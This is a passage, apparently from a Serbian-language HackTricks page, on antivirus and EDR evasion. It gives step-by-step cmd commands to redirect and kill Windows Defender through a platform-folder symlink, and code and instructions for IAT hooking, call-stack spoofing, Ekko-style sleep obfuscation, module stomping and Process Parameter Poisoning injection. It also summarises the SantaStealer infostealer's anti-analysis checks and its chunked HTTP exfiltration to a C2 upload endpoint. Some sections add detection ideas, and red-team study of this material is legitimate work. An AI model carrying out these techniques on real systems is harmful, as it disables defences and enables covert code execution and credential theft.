Preduslovi
- Lokalni Administrator (potreban za kreiranje direktorijuma/symlink-ova unutar Platform foldera)
- Mogućnost reboot-a ili pokretanja ponovnog izbora Defender platforme (restart servisa pri boot-u)
- Potrebni su samo ugrađeni alati (mklink)

Zašto funkcioniše
- Defender blokira upisivanje u sopstvene foldere, ali njegov izbor platforme veruje unosima direktorijuma i bira leksikografski najvišu verziju bez provere da li se cilj razrešava na zaštićenu/poverljivu putanju.

Korak po korak (primer)
1) Pripremite writable klon trenutnog platform foldera, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte symlink direktorijuma više verzije unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da pratite novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registry koja odražava tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/code execution: Ubacite/zamenite DLL datoteke koje Defender učitava iz svog aplikacionog direktorijuma kako biste izvršili kod u Defender procesima. Pogledajte prethodni odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink kako se pri sledećem pokretanju konfigurisana putanja ne bi razrešila i Defender ne bi uspeo da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; zahtevaju se administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogu da premeste runtime evasion iz C2 implanta u sam ciljni modul tako što će zakačiti njegovu Import Address Table (IAT) i usmeriti odabrane API-je kroz attacker-controlled, position-independent code (PIC). Ovo generalizuje evasion izvan malog API opsega koji mnogi kit-ovi izlažu (npr. CreateProcessA) i proširuje iste zaštite na BOF-ove i post-exploitation DLL-ove.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Stage-ujte PIC blob uz ciljni modul koristeći reflective loader (prethodno dodat ili prateći). PIC mora biti self-contained i position-independent.
- Kada se host DLL učita, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i zakrpite IAT unose za ciljane import-e (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC wrapper-e.
- Svaki PIC wrapper izvršava evasion radnje pre tail-calling-a stvarne API adrese. Tipične evasion radnje uključuju:
- Memory mask/unmask oko poziva (npr. encrypt beacon region-e, RWX→RX, promena page name-ova/permissions), a zatim njihovo vraćanje nakon poziva.
- Call-stack spoofing: konstruišite benigni stack i pređite u ciljni API tako da se pri call-stack analizi dobiju očekivani frame-ovi.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izvezite interfejs kako bi Aggressor script (ili ekvivalent) mogao da registruje koje API-je treba hook-ovati za Beacon, BOF-ove i post-ex DLL-ove.

Zašto ovde koristiti IAT hooking
- Funkcioniše za svaki kod koji koristi hook-ovani import, bez menjanja tool koda ili oslanjanja na Beacon da proxy-uje određene API-je.
- Pokriva post-ex DLL-ove: hooking LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog masking/stack evasion-a na njihove API pozive.
- Vraća pouzdanu upotrebu post-ex komandi za kreiranje procesa protiv detekcija zasnovanih na call-stack-u, tako što obmotava CreateProcessA/W.

Minimalni IAT hook prikaz (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Beleške
- Primeni patch nakon relocations/ASLR, a pre prve upotrebe importa. Reflective loaders kao što su TitanLdr/AceLdr demonstriraju hooking tokom DllMain učitanog modula.
- Wrapper-i treba da budu mali i PIC-safe; razreši pravi API preko originalne IAT vrednosti koju si sačuvao pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj ostavljanje writable+executable stranica.

Stub za call-stack spoofing
- PIC stub-ovi u Draugr stilu grade lažni call chain (return addresses unutar benignih modula), a zatim prelaze u pravi API.
- Ovo zaobilazi detekcije koje očekuju canonical stack-ove od Beacon/BOFs ka osetljivim API-jima.
- Kombinuj sa tehnikama stack cutting/stack stitching kako bi se izvršavanje smestilo unutar očekivanih frame-ova pre API prologa.

Operativna integracija
- Dodaj reflective loader na početak post-ex DLL-ova kako bi se PIC i hooks automatski inicijalizovali prilikom učitavanja DLL-a.
- Koristi Aggressor script za registraciju ciljanih API-ja, tako da Beacon i BOFs transparentno koriste isti evasion path bez izmene koda.

Detekcija/DFIR razmatranja
- IAT integritet: entries koji se razrešavaju na adrese koje nisu deo image-a (heap/anon); periodična verifikacija import pointer-a.
- Anomalije stack-a: return addresses koji ne pripadaju učitanim image-ima; nagli prelazi na non-image PIC; nedosledna RtlUserThreadStart ancestrija.
- Telemetrija loader-a: writes unutar procesa ka IAT-u, rana DllMain aktivnost koja menja import thunk-ove, neočekivani RX regioni kreirani pri učitavanju.
- Evasion image-load-a: ako se hook-uje LoadLibrary*, prati sumnjiva učitavanja automation/clr assemblies povezana sa događajima memory masking-a.

Povezani building blocks i primeri
- Reflective loaders koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub-ovi (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks preko rezidentnog PICO-a

Ako kontrolišeš reflective loader, možeš hook-ovati importe **tokom `ProcessImports()`** tako što zamenjuješ loader-ov `GetProcAddress` pointer prilagođenim resolver-om koji prvo proverava hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Napravi **resident PICO** (persistent PIC object) koji preživljava nakon što se transient loader PIC oslobodi.
- Eksportuj `setup_hooks()` funkciju koja prepisuje loader-ov import resolver (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress` preskoči ordinal importe i koristi hash-based hook lookup poput `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom prosledi poziv pravom `GetProcAddress`.
- Registruj hook targets u vreme linkovanja pomoću Crystal Palace `addhook "MODULE$Func" "hook"` entries. Hook ostaje validan jer se nalazi unutar rezidentnog PICO-a.

Ovo omogućava **import-time IAT redirection** bez patchovanja code section-a učitanog DLL-a nakon učitavanja.

### Forsiranje hookable importa kada target koristi PEB-walking

Import-time hooks se aktiviraju samo ako je funkcija zaista prisutna u IAT-u targeta. Ako modul razrešava API-je preko PEB-walk + hash (bez import entry-ja), forsiraj pravi import kako bi loader-ov `ProcessImports()` path mogao da ga vidi:

- Zameni hashed export resolution (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom poput `&WaitForSingleObject`.
- Compiler generiše IAT entry, čime se omogućava interception kada reflective loader razrešava importe.

### Ekko-style sleep/idle obfuscation bez patchovanja `Sleep()`

Umesto patchovanja `Sleep`, hook-uj **stvarne wait/IPC primitive** koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duga čekanja, obavij poziv Ekko-style obfuscation chain-om koji šifruje image u memoriji tokom idle perioda:<sup>[[31]](#references)[[27]](#references)</sup>

- Koristi `CreateTimerQueueTimer` za zakazivanje niza callback-ova koji pozivaju `NtContinue` sa kreiranim `CONTEXT` frame-ovima.
- Tipičan chain (x64): postavi image na `PAGE_READWRITE` → RC4 encrypt preko `advapi32!SystemFunction032` nad celim mapiranim image-om → izvrši blocking wait → RC4 decrypt → **obnovi dozvole po sekcijama** prolaskom kroz PE sekcije → signalizuj završetak.
- `RtlCaptureContext` obezbeđuje template `CONTEXT`; kloniraj ga u više frame-ova i postavi registre (`Rip/Rcx/Rdx/R8/R9`) za pozivanje svakog koraka.

Operativni detalj: vrati “success” za duga čekanja (npr. `WAIT_OBJECT_0`) kako bi caller nastavio izvršavanje dok je image maskiran. Ovaj pattern skriva modul od scanner-a tokom idle prozora i izbegava klasični signature “patched `Sleep()`”.

Ideje za detekciju (zasnovane na telemetry-ju)
- Burst-ovi `CreateTimerQueueTimer` callback-ova koji pokazuju na `NtContinue`.
- `advapi32!SystemFunction032` korišćen nad velikim kontinualnim buffer-ima veličine image-a.
- `VirtualProtect` nad velikim opsegom, praćen custom obnavljanjem dozvola po sekcijama.

### Runtime CFG registracija gadget-a za sleep-obfuscation

Na CFG-enabled target-ima, prvi indirect jump na mid-function gadget kao što je `jmp [rbx]` ili `jmp rdi` obično će srušiti proces sa `STATUS_STACK_BUFFER_OVERRUN`, jer gadget nije prisutan u CFG metadata-i modula. Da bi Ekko/Kraken-style chains nastavili da rade unutar hardened procesa:<sup>[[30]](#references)</sup>

- Registruj svaku indirect destination koju chain koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i `CFG_CALL_TARGET_VALID` entries.
- Za adrese unutar učitanih image-a (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počne na **image base-u** i obuhvati **punu veličinu image-a**.
- Za manually mapped/PIC/stomped regione, koristi **allocation base** i allocation size.
- Obeleži ne samo dispatch gadget, već i exports do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), kao i sve attacker-controlled executable sekcije koje će postati indirect targets.

Ovo pretvara sleep chains ROP/JOP stila iz primitive koja "radi samo u non-CFG procesima" u reusable primitive za `explorer.exe`, browsere, `svchost.exe` i druge endpoints kompajlirane sa `/guard:cf`.

### CET-safe stack spoofing za thread-ove tokom spavanja

Potpuna zamena `CONTEXT`-a je noisy i može da izazove probleme na CET Shadow Stack sistemima, jer spoofed `Rip` i dalje mora da se slaže sa hardware shadow stack-om. Bezbedniji sleep-masking pattern je:<sup>[[30]](#references)</sup>

- Izaberi drugi thread u istom procesu i pročitaj njegove `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) preko `NtQueryInformationThread`.
- Napravi backup stvarnog TEB/TIB-a trenutnog thread-a.
- Uhvatiti stvarni sleeping context pomoću `GetThreadContext`.
- Kopiraj **samo stvarni `Rip`** u spoof context, ostavljajući spoofed `Rsp`/stack state nepromenjenim.
- Tokom sleep prozora kopiraj spoof thread-ov `NT_TIB` u trenutni TEB kako bi stack walkers vršili unwind unutar legitimnog stack range-a.
- Nakon završetka wait-a, obnovi originalni TIB i thread context.

Ovim se čuva CET-consistent instruction pointer, dok se EDR stack walkers dovode u zabludu koji se oslanjaju na TEB stack metadata-u za validaciju unwind-ova.

### APC-based alternativa: Kraken Mask

Ako je timer-queue dispatch previše signatured, ista sleep-encrypt-spoof-restore sekvenca može da se izvrši iz suspended helper thread-a pomoću queued APC-ova:<sup>[[27]](#references)</sup>

- Kreiraj helper thread sa `NtTestAlert` kao entrypoint-om.
- Queue-uj pripremljene `CONTEXT` frame-ove/APC-ove pomoću `NtQueueApcThread` i isprazni ih preko `NtAlertResumeThread`.
- Čuvaj chain state na heap-u umesto na helper stack-u kako bi se izbeglo iscrpljivanje podrazumevanog thread stack-a od 64 KB.
- Koristi `NtSignalAndWaitForSingleObject` za atomsko signalizovanje start event-a i blokiranje.
- Suspenduj main thread pre obnavljanja TIB-a/context-a (`NtSuspendThread` → restore → `NtResumeThread`) kako bi se smanjio race window u kom bi scanner mogao da uhvati delimično obnovljen stack.

Ovim se `CreateTimerQueueTimer` + `NtContinue` signature zamenjuje helper-thread/APC signature-om, uz zadržavanje istih ciljeva RC4 maskiranja i stack spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre sleep-ova, wait-ova ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` oko `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread` praćen direktnim upisima u TEB/TIB stack bounds trenutnog thread-a.
- `NtQueueApcThread`/`NtAlertResumeThread` chains koji indirektno dosežu `SystemFunction032`, `VirtualProtect` ili helper-e za obnavljanje dozvola sekcija.
- Ponovljena upotreba kratkih gadget signatures kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`) kao dispatch pivots unutar signed modula.


## Precision Module Stomping

Module stomping izvršava payload iz **`.text` sekcije DLL-a koji je već mapiran unutar target procesa**, umesto alociranja očigledne private executable memorije ili učitavanja novog sacrificial DLL-a. Target za overwrite treba da bude **učitan, disk-backed image** čiji code space može da primi payload bez korumpiranja code path-ova koji su procesu i dalje potrebni.<sup>[[1]](#references)[[2]](#references)</sup>

### Pouzdan izbor targeta

Naive stomping nad uobičajenim modulima kao što su `uxtheme.dll` ili `comctl32.dll` je nepouzdan: DLL možda nije učitan u remote procesu, a premali code region će srušiti proces. Pouzdaniji workflow je:

1. Enumeriši module target procesa i zadrži **names-only include list** DLL-ova koji su već učitani.
2. Prvo izgradi payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Skeniraj candidate DLL-ove na disku i uporedi PE sekciju **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od veličine fajla jer odražava veličinu executable sekcije **kada se mapira u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi RVA eksportovane funkcije kao početni offset za stomp.
5. Izračunaj **blast radius**: ako payload prelazi granicu izabrane funkcije, overwrite-ovaće susedne export-e raspoređene nakon nje u memoriji.

Tipični recon/selection helper-i koji se mogu videti u praksi:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operativne napomene
- Dajte prednost DLL-ovima koji su **već učitani** u udaljenom procesu kako biste izbegli telemetriju funkcije `LoadLibrary`/neočekivanih učitavanja image-a.
- Dajte prednost export-ima koji se ciljnom aplikacijom retko izvršavaju; u suprotnom, uobičajeni tokovi koda mogu naići na izmenjene bajtove pre ili nakon kreiranja threada.
- Veliki implant-i često zahtevaju promenu načina ugrađivanja shellcode-a sa string literala na **byte-array/braced initializer**, kako bi ceo bafer bio ispravno predstavljen u izvornom kodu injector-a.

Ideje za detekciju
- Udaljeni upisi u **image-backed izvršne stranice** (`MEM_IMAGE`, `PAGE_EXECUTE*`) umesto uobičajenijih privatnih RWX/RX alokacija.
- Export entry point-i čiji se bajtovi u memoriji više ne podudaraju sa odgovarajućim fajlom na disku.
- Udaljeni thread-ovi ili promene konteksta koji započinju izvršavanje unutar legitimnog DLL export-a čiji su prvi bajtovi nedavno izmenjeni.
- Sumnjive sekvence `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje threada.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je tehnika **process-injection / EDR-evasion** koja izbegava klasičan put udaljenog upisa (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenuti ciljni proces, ona zloupotrebljava činjenicu da Windows **kopira odabrane početne parametre funkcije `CreateProcessW` u child process** i skladišti ih unutar `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Korisni carrier-i su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (sa `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja carrier-a:

- `lpCommandLine` mora pokazivati na **upisivu memoriju** za `CreateProcessW`, a ograničen je na **32,767 Unicode karaktera**, uključujući null terminator.
- `lpEnvironment` mora biti Unicode environment block koji se sastoji od uzastopnih stringova formata `NAME=VALUE\0`, završenih dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba tretirati kao detalj implementacije, a ne kao stabilan dokumentovan ugovor.

Time se normalno kreiranje procesa pretvara u **payload-transfer primitive**. Operator kreira child process sa početnim podacima pod kontrolom napadača i dopušta Windows-u da izvrši kopiranje između procesa.

### Remote lookup flow without remote write APIs

Nakon kreiranja child process-a, kopirani bafer se pronalazi pomoću **read-only** primitiva:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobavljanje `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Čitanje udaljenog `PEB`-a
3. Praćenje `PEB.ProcessParameters`
4. Čitanje `RTL_USER_PROCESS_PARAMETERS`
5. Korišćenje odabranog pokazivača:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimalni tok:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Izvršavanje kopiranog bafera parametra

Kopirani region parametara je obično `RW`, a ne izvršiv. Uobičajeni P3 chain je:

1. Kreirajte proces na uobičajen način (ne suspendovan)
2. Učinite izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebite handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmerite izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepišite `RIP`)

Za razliku od klasičnih workflow-a za hijacking niti, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; kontekst se može promeniti direktno na vraćenom handle-u glavne niti.

Time se izbegava nekoliko API-ja koji se često nadziru kod injection-a:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često i `SuspendThread` / `ResumeThread`

### Ograničenje null-byte vrednosti i staged shellcode

Sva tri carrier-a su **string ili string-like podaci**, pa se raw payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **null-free first stage** koji rekonstruiše konstante tokom izvršavanja, a zatim učitava proizvoljni second stage.

Jednostavan obrazac je synthesis konstanti zasnovana na XOR-u:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Ovo omogućava da first stage formira stringove za stek, API argumente, DLL putanje ili second-stage shellcode loader bez ugrađivanja null bajtova u transportovani parametar.

### Stack-based API calls from the first stage

Kada first stage mora da pozove API-je kao što je `LoadLibraryA`, može da:

- postavi string/buffer na stek cilja
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- zadrži `RSP` **16-byte aligned** pre poziva

Second stage se zatim može kopirati sa steka u `PAGE_READWRITE` alokaciju, promeniti u `PAGE_EXECUTE_READ` pomoću `VirtualProtect` i na njega se može preći, čime se izbegava direktna RWX alokacija.

### Detection ideas

Dobre mogućnosti za hunting koje su autori naveli:

- `VirtualProtectEx` / `NtProtectVirtualMemory` koji **process-parameter pages** čine izvršivim
- ta promena zaštite praćena pozivom `SetThreadContext` / `NtSetContextThread`
- udaljena čitanja `PEB`-a, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugi / high-entropy `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` podaci tokom kreiranja procesa

### Notes

- P3 je **cross-process transfer trick**, a ne potpuna execution primitive sam po sebi: kopiranom parametru je i dalje potrebna promena dozvole izvršavanja i metod preusmeravanja izvršavanja.
- `RtlCreateProcessReflection` / Dirty Vanity autori su razmatrali, ali su ga odbacili zato što interno dolazi do sumnjivih primitives kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (poznat i kao BluelineStealer) prikazuje kako moderni info-stealers objedinjuju AV bypass, anti-analysis i credential access u jednom workflow-u.<sup>[[24]](#references)</sup>

### Keyboard layout gating & sandbox delay

- Config flag (`anti_cis`) nabraja instalirane keyboard layouts pomoću `GetKeyboardLayoutList`. Ako se pronađe Cyrillic layout, sample kreira prazan `CIS` marker i prekida rad pre pokretanja stealers, čime osigurava da se nikada ne aktivira na isključenim localima, ali ostavlja hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Slojevita logika `check_antivm`

- Varijanta A prolazi kroz listu procesa, hešira svaki naziv prilagođenom rolling checksum funkcijom i upoređuje ga sa ugrađenim blocklistama za debuggere/sandbox okruženja; ponavlja checksum nad nazivom računara i proverava radne direktorijume kao što je `C:\analysis`.
- Varijanta B proverava sistemska svojstva (minimalni broj procesa, nedavno vreme rada), poziva `OpenServiceA("VBoxGuest")` radi detekcije VirtualBox dodataka i obavlja vremenske provere oko operacija spavanja kako bi otkrila single-stepping. Svaki pogodak prekida izvršavanje pre pokretanja modula.

### Fileless helper + dvostruko ChaCha20 reflektivno učitavanje

- Primarni DLL/EXE ugrađuje Chromium credential helper koji se ili zapisuje na disk ili ručno mapira u memoriju; fileless režim samostalno rešava import-e/relokacije, tako da se artefakti helper-a ne zapisuju.
- Taj helper čuva DLL druge faze dvostruko šifrovan pomoću ChaCha20 (dva ključa od 32 bajta + nonce vrednosti od 12 bajtova). Nakon oba prolaza, reflektivno učitava blob (bez `LoadLibrary`) i poziva eksport-e `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedene iz projekta [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- ChromElevator rutine koriste reflektivni process hollowing putem direct-syscall mehanizma za ubacivanje u aktivan Chromium browser, nasleđuju AppBound Encryption ključeve i dešifruju lozinke/cookies/platne kartice direktno iz SQLite baza, uprkos ABE hardening-u.


### Modularno prikupljanje u memoriji i chunked HTTP eksfiltracija

- `create_memory_based_log` prolazi kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće po jednu nit za svaki omogućen modul (Telegram, Discord, Steam, screenshots, dokumenti, browser ekstenzije itd.). Svaka nit upisuje rezultate u deljene buffere i prijavljuje broj svojih fajlova nakon prozora za čekanje od približno 45 sekundi.
- Po završetku, sve se pakuje pomoću statički linkovane `miniz` biblioteke kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim čeka 15 sekundi i šalje arhivu u chunk-ovima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, oponašajući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, dok poslednji chunk dodaje `complete: true`, kako bi C2 znao da je ponovno sastavljanje završeno.

## References

- [1] [Napredni evasion tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, nema više besplatnog prolaza za malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacija](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – primer](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – primer](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC za spoofing call stack-a](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Novi lanac infekcije i obfuskacija zasnovana na ConfuserEx za DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Da li treba verovati svom zero trust-u? Zaobilaženje Zscaler posture provera](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Pre ToolShell-a: Istraživanje prethodnih ransomware operacija grupe Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Zloupotreba forwarded export-a](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar forwarded export-a sistema Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Redosled pretrage dynamic-link library-ja](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bezbednost procesa i prava pristupa](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU referenca (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Suprotstavljanje EDR-ovima uz podršku Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Razbijanje zaštitnog omotača Windows Defender-a tehnikom preusmeravanja foldera](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenca za komandu mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Ispod Pure Curtain-a: Od RAT-a do builder-a i coder-a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer stiže u grad: Novi, ambiciozni infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Poraz Node.js malware-a pomoću API tracing-a](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Uspavljivanje Adaptix-a pomoću Crystal Palace-a](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET i spoofing stack-a](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Sakrivanje Dotnet ETW-a](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Zloupotreba Chrome Remote Desktop-a u Red Team operacijama: praktični vodič](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
{{#include ../banners/hacktricks-training.md}}
